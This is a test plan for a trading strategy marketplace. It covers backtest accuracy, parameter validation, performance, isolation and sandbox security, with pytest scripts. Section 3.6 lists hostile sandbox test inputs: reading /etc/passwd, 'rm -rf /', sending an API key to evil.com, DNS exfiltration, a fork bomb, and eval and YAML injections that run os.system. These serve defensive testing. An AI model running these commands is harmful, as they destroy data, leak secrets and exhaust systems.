# Strategy Marketplace Testing

## 1. Test Strategy

### 1.1 Objectives

- Verify strategy templates execute correctly with expected results
- Validate parameter validation for all strategy types
- Ensure backtest results are accurate and reproducible
- Test performance with large datasets
- Verify concurrent strategy execution and isolation
- Confirm strategy sandboxing prevents malicious code

### 1.2 Scope

| In Scope | Out of Scope |
|----------|--------------|
| Built-in strategy templates | Custom user strategies |
| Parameter validation | Strategy development tools |
| Backtest accuracy | Live trading execution |
| Performance testing | Strategy optimization algorithms |
| Strategy isolation | Multi-tenant marketplace |
| Security sandboxing | Strategy monetization |

### 1.3 Strategy Templates

| Strategy | Type | Risk Level | Complexity |
|----------|------|------------|------------|
| Grid Trading | Market Making | Medium | Low |
| DCA (Dollar Cost Averaging) | Accumulation | Low | Low |
| Mean Reversion | Statistical | Medium | Medium |
| Momentum | Trend Following | High | Medium |
| Market Making | Liquidity | Medium | High |
| Trend Following | Directional | High | Medium |

## 2. Test Environment

### 2.1 Test Data Requirements

| Data Type | Source | Size | Purpose |
|-----------|--------|------|---------|
| Historical OHLCV | Binance API | 1 year | Backtest accuracy |
| Tick data | Binance WebSocket | 1 month | High-frequency testing |
| Order book snapshots | Recorded | 1 week | Market making tests |
| Synthetic data | Generated | Variable | Edge case testing |

### 2.2 Performance Test Environment

| Resource | Specification |
|----------|---------------|
| CPU | 8 cores |
| Memory | 32 GB |
| Storage | SSD, 500 GB |
| Network | 1 Gbps |

## 3. Test Cases

### 3.1 Template Execution Accuracy

#### TC-STR-001: Grid Trading Strategy Execution

| Field | Value |
|-------|-------|
| **ID** | TC-STR-001 |
| **Priority** | P0 |
| **Preconditions** | Historical data loaded, strategy configured |

**Strategy Parameters:**
```json
{
  "symbol": "BTCUSDT",
  "grid_count": 10,
  "upper_price": 50000,
  "lower_price": 40000,
  "total_investment": 10000
}
```

**Steps:**
1. Load Grid Trading template
2. Configure parameters as above
3. Run backtest on 30-day historical data
4. Analyze results

**Expected Results:**
- [ ] 10 grid levels created correctly
- [ ] Grid spacing: (50000-40000)/10 = 1000 USDT
- [ ] Buy orders placed at each grid level
- [ ] Sell orders placed one grid above buy
- [ ] Total investment distributed across grids
- [ ] P&L calculation accurate
- [ ] Trade count matches grid triggers

#### TC-STR-002: DCA Strategy Execution

| Field | Value |
|-------|-------|
| **ID** | TC-STR-002 |
| **Priority** | P0 |
| **Preconditions** | Historical data loaded |

**Strategy Parameters:**
```json
{
  "symbol": "BTCUSDT",
  "investment_amount": 100,
  "frequency": "daily",
  "duration_days": 30
}
```

**Steps:**
1. Load DCA template
2. Configure parameters
3. Run backtest on 30-day data
4. Verify execution

**Expected Results:**
- [ ] 30 buy orders executed (one per day)
- [ ] Each order = 100 USDT
- [ ] Total invested = 3000 USDT
- [ ] Average price calculated correctly
- [ ] Final position matches sum of fills

#### TC-STR-003: Mean Reversion Strategy Execution

| Field | Value |
|-------|-------|
| **ID** | TC-STR-003 |
| **Priority** | P0 |
| **Preconditions** | Historical data with volatility |

**Strategy Parameters:**
```json
{
  "symbol": "BTCUSDT",
  "lookback_period": 20,
  "entry_threshold": 2.0,
  "exit_threshold": 0.5,
  "position_size": 0.1
}
```

**Steps:**
1. Load Mean Reversion template
2. Configure parameters
3. Run backtest on 90-day data
4. Verify signal generation

**Expected Results:**
- [ ] Entry signals when price > 2 std dev from mean
- [ ] Exit signals when price returns to 0.5 std dev
- [ ] Position sizing correct (0.1 BTC per trade)
- [ ] Stop loss triggers if configured
- [ ] Sharpe ratio calculated correctly

#### TC-STR-004: Momentum Strategy Execution

| Field | Value |
|-------|-------|
| **ID** | TC-STR-004 |
| **Priority** | P0 |
| **Preconditions** | Trending market data |

**Strategy Parameters:**
```json
{
  "symbol": "BTCUSDT",
  "fast_period": 12,
  "slow_period": 26,
  "signal_period": 9,
  "position_size": 0.1
}
```

**Steps:**
1. Load Momentum (MACD) template
2. Configure parameters
3. Run backtest
4. Verify signals

**Expected Results:**
- [ ] MACD line calculated correctly
- [ ] Signal line calculated correctly
- [ ] Buy on MACD cross above signal
- [ ] Sell on MACD cross below signal
- [ ] Histogram values accurate

### 3.2 Parameter Validation

#### TC-PAR-001: Grid Strategy Parameter Validation

| Field | Value |
|-------|-------|
| **ID** | TC-PAR-001 |
| **Priority** | P0 |
| **Preconditions** | Grid strategy template open |

**Test Data:**
| Parameter | Invalid Value | Expected Error |
|-----------|---------------|----------------|
| grid_count | 0 | "Must be at least 2" |
| grid_count | 1001 | "Maximum 1000 grids" |
| upper_price | -100 | "Must be positive" |
| lower_price | 60000 (> upper) | "Must be less than upper" |
| total_investment | 0 | "Must be positive" |

**Expected Results:**
- [ ] Each invalid value shows appropriate error
- [ ] Form cannot be submitted with invalid values
- [ ] Valid values accepted and saved

#### TC-PAR-002: DCA Strategy Parameter Validation

| Field | Value |
|-------|-------|
| **ID** | TC-PAR-002 |
| **Priority** | P0 |
| **Preconditions** | DCA strategy template open |

**Test Data:**
| Parameter | Invalid Value | Expected Error |
|-----------|---------------|----------------|
| investment_amount | 0 | "Must be positive" |
| investment_amount | -100 | "Must be positive" |
| frequency | "invalid" | "Invalid frequency" |
| duration_days | 0 | "Must be at least 1" |
| duration_days | 3651 | "Maximum 10 years" |

**Expected Results:**
- [ ] Validation errors displayed clearly
- [ ] Frequency dropdown limits options
- [ ] Duration range enforced

#### TC-PAR-003: Cross-Parameter Validation

| Field | Value |
|-------|-------|
| **ID** | TC-PAR-003 |
| **Priority** | P1 |
| **Preconditions** | Strategy configuration open |

**Test Cases:**
1. Grid: upper_price must be > lower_price
2. Mean Reversion: entry_threshold must be > exit_threshold
3. Momentum: fast_period must be < slow_period
4. All: position_size must not exceed account balance

**Expected Results:**
- [ ] Cross-parameter validation performed
- [ ] Clear error messages for conflicts
- [ ] Suggestions for valid combinations

### 3.3 Backtest Correctness

#### TC-BT-001: Backtest P&L Accuracy

| Field | Value |
|-------|-------|
| **ID** | TC-BT-001 |
| **Priority** | P0 |
| **Preconditions** | Known historical data, known strategy |

**Steps:**
1. Use fixed historical data (no randomness)
2. Run Grid strategy with known parameters
3. Manually calculate expected P&L
4. Compare with backtest result

**Expected Results:**
- [ ] P&L matches manual calculation within 0.01%
- [ ] Trade count matches expected
- [ ] Fill prices match historical data
- [ ] Fees calculated correctly
- [ ] Slippage applied if configured

#### TC-BT-002: Backtest Reproducibility

| Field | Value |
|-------|-------|
| **ID** | TC-BT-002 |
| **Priority** | P0 |
| **Preconditions** | Strategy configured |

**Steps:**
1. Run backtest with fixed parameters
2. Record all results
3. Run identical backtest again
4. Compare results

**Expected Results:**
- [ ] Identical P&L
- [ ] Identical trade count
- [ ] Identical trade timestamps
- [ ] Identical metrics (Sharpe, drawdown, etc.)

#### TC-BT-003: Backtest with Fees and Slippage

| Field | Value |
|-------|-------|
| **ID** | TC-BT-003 |
| **Priority** | P0 |
| **Preconditions** | Strategy configured |

**Test Configurations:**
| Config | Fee | Slippage | Expected Impact |
|--------|-----|----------|-----------------|
| No fees | 0% | 0% | Baseline P&L |
| Maker fee | 0.1% | 0% | P&L reduced |
| Taker fee | 0.1% | 0% | P&L reduced |
| Slippage | 0% | 0.1% | P&L reduced |
| Combined | 0.1% | 0.1% | Maximum reduction |

**Expected Results:**
- [ ] Fees deducted from each trade
- [ ] Slippage applied to fill prices
- [ ] Net P&L = Gross P&L - Fees - Slippage cost
- [ ] Fee breakdown shown in report

#### TC-BT-004: Backtest Metrics Accuracy

| Field | Value |
|-------|-------|
| **ID** | TC-BT-004 |
| **Priority** | P0 |
| **Preconditions** | Completed backtest |

**Metrics to Verify:**
| Metric | Formula | Tolerance |
|--------|---------|-----------|
| Total Return | (Final - Initial) / Initial | 0.01% |
| Sharpe Ratio | (Return - Rf) / StdDev | 0.01 |
| Max Drawdown | Max peak-to-trough decline | 0.01% |
| Win Rate | Winning trades / Total trades | 0.1% |
| Profit Factor | Gross profit / Gross loss | 0.01 |

**Expected Results:**
- [ ] All metrics calculated correctly
- [ ] Metrics match manual calculation
- [ ] Edge cases handled (no trades, all wins, all losses)

### 3.4 Performance Testing

#### TC-PERF-001: Large Dataset Backtest

| Field | Value |
|-------|-------|
| **ID** | TC-PERF-001 |
| **Priority** | P0 |
| **Preconditions** | 1 year of 1-minute data loaded |

**Test Data:**
- Symbol: BTCUSDT
- Timeframe: 1 minute
- Duration: 1 year
- Data points: ~525,600

**Steps:**
1. Load 1 year of 1-minute data
2. Run Grid strategy backtest
3. Measure execution time
4. Monitor memory usage

**Expected Results:**
- [ ] Backtest completes in < 60 seconds
- [ ] Memory usage < 2 GB
- [ ] No memory leaks
- [ ] Progress indicator accurate

#### TC-PERF-002: Concurrent Strategy Execution

| Field | Value |
|-------|-------|
| **ID** | TC-PERF-002 |
| **Priority** | P0 |
| **Preconditions** | Multiple strategies configured |

**Steps:**
1. Configure 5 different strategies
2. Start all backtests simultaneously
3. Monitor system resources
4. Verify all complete correctly

**Expected Results:**
- [ ] All backtests complete successfully
- [ ] No interference between strategies
- [ ] CPU utilization efficient (parallel execution)
- [ ] Memory usage scales linearly
- [ ] Results identical to sequential execution

#### TC-PERF-003: High-Frequency Data Processing

| Field | Value |
|-------|-------|
| **ID** | TC-PERF-003 |
| **Priority** | P1 |
| **Preconditions** | Tick data available |

**Test Data:**
- Data type: Tick-by-tick trades
- Volume: 1 million ticks
- Duration: 1 day

**Steps:**
1. Load tick data
2. Run market making strategy
3. Measure throughput
4. Verify accuracy

**Expected Results:**
- [ ] Process > 100,000 ticks/second
- [ ] Latency < 10 microseconds per tick
- [ ] No data loss
- [ ] Order book state accurate

### 3.5 Strategy Isolation

#### TC-ISO-001: Memory Isolation

| Field | Value |
|-------|-------|
| **ID** | TC-ISO-001 |
| **Priority** | P0 |
| **Preconditions** | Two strategies running |

**Steps:**
1. Start Strategy A with state X
2. Start Strategy B with state Y
3. Verify A cannot access B's state
4. Crash Strategy A
5. Verify Strategy B continues

**Expected Results:**
- [ ] No shared memory between strategies
- [ ] Strategy A crash does not affect B
- [ ] State isolation verified
- [ ] No data leakage between strategies

#### TC-ISO-002: Resource Isolation

| Field | Value |
|-------|-------|
| **ID** | TC-ISO-002 |
| **Priority** | P0 |
| **Preconditions** | Resource-intensive strategy |

**Steps:**
1. Start Strategy A (CPU intensive)
2. Start Strategy B (normal)
3. Monitor resource allocation
4. Verify fair scheduling

**Expected Results:**
- [ ] CPU limits enforced per strategy
- [ ] Memory limits enforced per strategy
- [ ] Strategy A cannot starve Strategy B
- [ ] Resource quotas configurable

#### TC-ISO-003: Error Isolation

| Field | Value |
|-------|-------|
| **ID** | TC-ISO-003 |
| **Priority** | P0 |
| **Preconditions** | Strategy with intentional error |

**Steps:**
1. Create strategy that throws exception
2. Run alongside healthy strategy
3. Observe error handling
4. Verify healthy strategy unaffected

**Expected Results:**
- [ ] Error contained to faulty strategy
- [ ] Error logged with context
- [ ] Healthy strategy continues
- [ ] User notified of error
- [ ] Option to restart failed strategy

### 3.6 Security Sandboxing

#### TC-SEC-001: File System Access Restriction

| Field | Value |
|-------|-------|
| **ID** | TC-SEC-001 |
| **Priority** | P0 |
| **Preconditions** | Strategy sandbox enabled |

**Malicious Code Attempts:**
```python
# Attempt 1: Read system file
with open('/etc/passwd', 'r') as f:
    data = f.read()

# Attempt 2: Write to system
with open('/tmp/malicious.txt', 'w') as f:
    f.write('hacked')

# Attempt 3: Execute command
import os
os.system('rm -rf /')
```

**Expected Results:**
- [ ] File read outside sandbox blocked
- [ ] File write outside sandbox blocked
- [ ] System command execution blocked
- [ ] Clear error message logged
- [ ] Strategy terminated

#### TC-SEC-002: Network Access Restriction

| Field | Value |
|-------|-------|
| **ID** | TC-SEC-002 |
| **Priority** | P0 |
| **Preconditions** | Strategy sandbox enabled |

**Malicious Code Attempts:**
```python
# Attempt 1: HTTP request
import requests
requests.get('http://evil.com/steal?data=' + api_key)

# Attempt 2: Socket connection
import socket
s = socket.socket()
s.connect(('evil.com', 80))

# Attempt 3: DNS exfiltration
import socket
socket.gethostbyname('data.evil.com')
```

**Expected Results:**
- [ ] HTTP requests blocked
- [ ] Raw socket connections blocked
- [ ] DNS queries restricted
- [ ] Only whitelisted endpoints allowed
- [ ] Violation logged and alerted

#### TC-SEC-003: Resource Exhaustion Prevention

| Field | Value |
|-------|-------|
| **ID** | TC-SEC-003 |
| **Priority** | P0 |
| **Preconditions** | Strategy sandbox enabled |

**Malicious Code Attempts:**
```python
# Attempt 1: Memory exhaustion
data = []
while True:
    data.append('x' * 1000000)

# Attempt 2: CPU exhaustion
while True:
    pass

# Attempt 3: Fork bomb
import os
while True:
    os.fork()
```

**Expected Results:**
- [ ] Memory limit enforced (e.g., 1 GB)
- [ ] CPU time limit enforced
- [ ] Process creation blocked
- [ ] Strategy terminated on limit breach
- [ ] System remains responsive

#### TC-SEC-004: Code Injection Prevention

| Field | Value |
|-------|-------|
| **ID** | TC-SEC-004 |
| **Priority** | P0 |
| **Preconditions** | Strategy parameter input |

**Malicious Inputs:**
```python
# Attempt 1: eval injection
parameter = "__import__('os').system('whoami')"

# Attempt 2: pickle deserialization
import pickle
malicious_pickle = b"..."  # crafted payload

# Attempt 3: YAML deserialization
yaml_input = "!!python/object/apply:os.system ['whoami']"
```

**Expected Results:**
- [ ] eval/exec disabled in sandbox
- [ ] Unsafe deserialization blocked
- [ ] Input sanitization applied
- [ ] Only safe parameter types allowed

## 4. Automated Test Scripts

### 4.1 Strategy Execution Tests (Python)

```python
# File: tests/strategy/test_strategy_execution.py

import pytest
import numpy as np
from veloz.strategy import GridStrategy, DCAStrategy, MeanReversionStrategy
from veloz.backtest import BacktestEngine
from veloz.data import HistoricalDataLoader

class TestGridStrategy:
    """Test Grid Trading strategy execution."""

    @pytest.fixture
    def historical_data(self):
        loader = HistoricalDataLoader()
        return loader.load(
            symbol="BTCUSDT",
            start="2024-01-01",
            end="2024-01-31",
            timeframe="1h"
        )

    @pytest.fixture
    def grid_strategy(self):
        return GridStrategy(
            symbol="BTCUSDT",
            grid_count=10,
            upper_price=50000,
            lower_price=40000,
            total_investment=10000
        )

    def test_grid_levels_created(self, grid_strategy):
        levels = grid_strategy.get_grid_levels()
        assert len(levels) == 10
        assert levels[0] == 40000
        assert levels[-1] == 49000  # Last buy level
        assert all(levels[i] < levels[i+1] for i in range(len(levels)-1))

    def test_grid_spacing(self, grid_strategy):
        levels = grid_strategy.get_grid_levels()
        spacing = levels[1] - levels[0]
        assert spacing == 1000  # (50000-40000)/10

    def test_backtest_execution(self, grid_strategy, historical_data):
        engine = BacktestEngine()
        result = engine.run(grid_strategy, historical_data)

        assert result.total_trades > 0
        assert result.final_balance > 0
        assert result.max_drawdown >= 0
        assert result.max_drawdown <= 1.0

    def test_backtest_reproducibility(self, grid_strategy, historical_data):
        engine = BacktestEngine()

        result1 = engine.run(grid_strategy, historical_data)
        result2 = engine.run(grid_strategy, historical_data)

        assert result1.total_pnl == result2.total_pnl
        assert result1.total_trades == result2.total_trades
        assert result1.sharpe_ratio == result2.sharpe_ratio


class TestDCAStrategy:
    """Test DCA strategy execution."""

    @pytest.fixture
    def dca_strategy(self):
        return DCAStrategy(
            symbol="BTCUSDT",
            investment_amount=100,
            frequency="daily",
            duration_days=30
        )

    def test_order_count(self, dca_strategy, historical_data):
        engine = BacktestEngine()
        result = engine.run(dca_strategy, historical_data)

        assert result.total_trades == 30  # One per day

    def test_total_investment(self, dca_strategy, historical_data):
        engine = BacktestEngine()
        result = engine.run(dca_strategy, historical_data)

        total_invested = sum(t.value for t in result.trades)
        assert abs(total_invested - 3000) < 1  # 30 * 100


class TestBacktestAccuracy:
    """Test backtest calculation accuracy."""

    def test_pnl_calculation(self):
        """Verify P&L matches manual calculation."""
        # Known trades
        trades = [
            {"side": "buy", "price": 100, "qty": 1},
            {"side": "sell", "price": 110, "qty": 1},
        ]

        expected_pnl = (110 - 100) * 1  # = 10

        engine = BacktestEngine()
        result = engine.calculate_pnl(trades)

        assert result == expected_pnl

    def test_fee_calculation(self):
        """Verify fees are deducted correctly."""
        trades = [
            {"side": "buy", "price": 100, "qty": 1, "fee_rate": 0.001},
            {"side": "sell", "price": 110, "qty": 1, "fee_rate": 0.001},
        ]

        gross_pnl = 10
        buy_fee = 100 * 1 * 0.001  # 0.1
        sell_fee = 110 * 1 * 0.001  # 0.11
        expected_net_pnl = gross_pnl - buy_fee - sell_fee  # 9.79

        engine = BacktestEngine()
        result = engine.calculate_pnl(trades, include_fees=True)

        assert abs(result - expected_net_pnl) < 0.01

    def test_sharpe_ratio_calculation(self):
        """Verify Sharpe ratio calculation."""
        returns = [0.01, 0.02, -0.01, 0.03, 0.01]
        risk_free_rate = 0.0

        mean_return = np.mean(returns)
        std_return = np.std(returns)
        expected_sharpe = (mean_return - risk_free_rate) / std_return

        engine = BacktestEngine()
        result = engine.calculate_sharpe(returns, risk_free_rate)

        assert abs(result - expected_sharpe) < 0.001

    def test_max_drawdown_calculation(self):
        """Verify max drawdown calculation."""
        equity_curve = [100, 110, 105, 115, 100, 120]

        # Peak: 115, Trough: 100, Drawdown: (115-100)/115 = 13.04%
        expected_drawdown = (115 - 100) / 115

        engine = BacktestEngine()
        result = engine.calculate_max_drawdown(equity_curve)

        assert abs(result - expected_drawdown) < 0.001


class TestStrategyIsolation:
    """Test strategy isolation and sandboxing."""

    def test_memory_isolation(self):
        """Verify strategies cannot access each other's memory."""
        strategy_a = GridStrategy(symbol="BTCUSDT", grid_count=10)
        strategy_b = GridStrategy(symbol="ETHUSDT", grid_count=20)

        # Modify strategy A state
        strategy_a._internal_state = "secret_a"

        # Strategy B should not see strategy A's state
        assert not hasattr(strategy_b, '_internal_state') or \
               strategy_b._internal_state != "secret_a"

    def test_error_isolation(self):
        """Verify one strategy's error doesn't affect others."""
        from veloz.strategy.sandbox import StrategySandbox

        sandbox = StrategySandbox()

        # Strategy that throws error
        def faulty_strategy():
            raise RuntimeError("Intentional error")

        # Healthy strategy
        results = []
        def healthy_strategy():
            results.append("success")

        # Run both
        sandbox.run(faulty_strategy)
        sandbox.run(healthy_strategy)

        # Healthy strategy should complete
        assert "success" in results
```

### 4.2 Performance Tests (Python)

```python
# File: tests/strategy/test_performance.py

import pytest
import time
import psutil
from veloz.backtest import BacktestEngine
from veloz.strategy import GridStrategy
from veloz.data import HistoricalDataLoader

class TestBacktestPerformance:
    """Performance tests for backtest engine."""

    @pytest.fixture
    def large_dataset(self):
        """Load 1 year of 1-minute data."""
        loader = HistoricalDataLoader()
        return loader.load(
            symbol="BTCUSDT",
            start="2023-01-01",
            end="2024-01-01",
            timeframe="1m"
        )

    def test_large_dataset_execution_time(self, large_dataset):
        """Backtest should complete in < 60 seconds."""
        strategy = GridStrategy(
            symbol="BTCUSDT",
            grid_count=100,
            upper_price=50000,
            lower_price=30000,
            total_investment=100000
        )

        engine = BacktestEngine()

        start_time = time.time()
        result = engine.run(strategy, large_dataset)
        execution_time = time.time() - start_time

        assert execution_time < 60, f"Execution took {execution_time:.2f}s"
        assert result.total_trades > 0

    def test_memory_usage(self, large_dataset):
        """Memory usage should stay under 2 GB."""
        strategy = GridStrategy(
            symbol="BTCUSDT",
            grid_count=100,
            upper_price=50000,
            lower_price=30000,
            total_investment=100000
        )

        engine = BacktestEngine()
        process = psutil.Process()

        initial_memory = process.memory_info().rss / 1024 / 1024  # MB

        result = engine.run(strategy, large_dataset)

        peak_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_used = peak_memory - initial_memory

        assert memory_used < 2048, f"Memory usage: {memory_used:.2f} MB"

    def test_concurrent_backtests(self, large_dataset):
        """Multiple backtests should run concurrently."""
        import concurrent.futures

        strategies = [
            GridStrategy(symbol="BTCUSDT", grid_count=10+i)
            for i in range(5)
        ]

        engine = BacktestEngine()

        start_time = time.time()

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [
                executor.submit(engine.run, strategy, large_dataset)
                for strategy in strategies
            ]
            results = [f.result() for f in futures]

        execution_time = time.time() - start_time

        # Should be faster than sequential (5x speedup ideal)
        assert execution_time < 120, f"Concurrent execution took {execution_time:.2f}s"
        assert all(r.total_trades > 0 for r in results)

    def test_throughput(self):
        """Measure event processing throughput."""
        from veloz.backtest import EventProcessor

        processor = EventProcessor()
        events = [{"type": "trade", "price": 50000 + i} for i in range(1000000)]

        start_time = time.time()
        for event in events:
            processor.process(event)
        execution_time = time.time() - start_time

        throughput = len(events) / execution_time
        assert throughput > 100000, f"Throughput: {throughput:.0f} events/sec"
```

## 5. Performance Benchmarks

### 5.1 Backtest Performance Targets

| Dataset Size | Target Time | Maximum Time |
|--------------|-------------|--------------|
| 1 day (1m) | < 1 sec | 5 sec |
| 1 week (1m) | < 5 sec | 15 sec |
| 1 month (1m) | < 15 sec | 30 sec |
| 1 year (1m) | < 60 sec | 120 sec |
| 1 year (tick) | < 300 sec | 600 sec |

### 5.2 Memory Usage Targets

| Operation | Target | Maximum |
|-----------|--------|---------|
| Idle strategy | < 50 MB | 100 MB |
| Active backtest | < 500 MB | 1 GB |
| Large dataset | < 2 GB | 4 GB |
| Concurrent (5) | < 4 GB | 8 GB |

### 5.3 Throughput Targets

| Metric | Target | Minimum |
|--------|--------|---------|
| Events/second | 500,000 | 100,000 |
| Trades/second | 10,000 | 1,000 |
| Strategies concurrent | 10 | 5 |

## 6. Security Testing Checklist

### 6.1 Sandbox Security

- [ ] File system access restricted to sandbox directory
- [ ] Network access blocked or whitelisted only
- [ ] System calls restricted
- [ ] Process creation blocked
- [ ] Memory limits enforced
- [ ] CPU time limits enforced
- [ ] No access to environment variables
- [ ] No access to other strategies' data

### 6.2 Input Validation

- [ ] Strategy parameters validated
- [ ] No code injection via parameters
- [ ] No SQL injection via parameters
- [ ] No path traversal via file parameters
- [ ] Numeric ranges enforced
- [ ] String lengths limited

### 6.3 Output Sanitization

- [ ] No sensitive data in logs
- [ ] No API keys in error messages
- [ ] No internal paths exposed
- [ ] No stack traces to users

## 7. UAT Plan

### 7.1 UAT Scenarios

1. **Grid Trading Setup**
   - Select Grid strategy template
   - Configure parameters
   - Run backtest
   - Analyze results
   - Deploy to paper trading

2. **DCA Strategy Setup**
   - Configure DCA parameters
   - Run backtest with different frequencies
   - Compare results
   - Select optimal configuration

3. **Strategy Comparison**
   - Run multiple strategies on same data
   - Compare performance metrics
   - Select best performing strategy

### 7.2 UAT Success Criteria

- Strategy setup completion rate > 95%
- Backtest accuracy verified by users
- Performance acceptable (< 60s for 1 year)
- No security concerns raised
- Results reproducible

## 8. Bug Tracking

### 8.1 Common Issues

| ID | Description | Severity | Status |
|----|-------------|----------|--------|
| STR-001 | Grid levels off by one | S1 | Fixed |
| STR-002 | Sharpe ratio NaN for no trades | S2 | Fixed |
| STR-003 | Memory leak in long backtests | S1 | In Progress |
